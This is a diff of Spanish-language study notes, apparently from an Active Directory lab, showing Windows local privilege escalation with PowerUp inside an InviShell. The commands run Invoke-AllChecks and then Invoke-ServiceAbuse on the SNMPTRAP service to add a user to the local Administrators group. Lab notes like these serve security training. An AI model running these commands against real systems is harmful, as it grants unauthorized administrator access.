@@ -152,7 +152,18 @@ Deberemos de tener iniciada una *InviShell* y ejecutar *PowerUp.ps1*
 . C:\AD\Tools\PowerUp.ps1
 ```
 
-Usaremos un atributo de PowerUp el cual nos permite enumerar todos los servicios vulnerables con las opciones vulnerables habilitadas como *CanRestar: True*, *Check: Modifiable Services* y *Unquoted service Paths*
+Usaremos un atributo de PowerUp el cual nos permite enumerar todos los servicios vulnerables con las opciones vulnerables habilitadas como *CanRestarr: True*, *Check: Modifiable Services* y *Unquoted service Paths*
 ```shell
-I
+Invoke-AllChecks
+```
+
+Hay varios servicios vulnerables, en este caso elegiremos un servicio que disponga de CanRestarr: True como es el servicio de SNMPTRAP
+Para abusar de el tendremos que revisar diferentes opciones para abusar de el
+```shell
+help Invoke-ServiceAbuse -Example
+```
+
+Buscaremos cual es la función que nosotros requerimos, en este caso queremos añadir a nuestro usuario al grupo de Administradores Locales
+```shell
+Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName "scorp\student97" -verbose
 ```
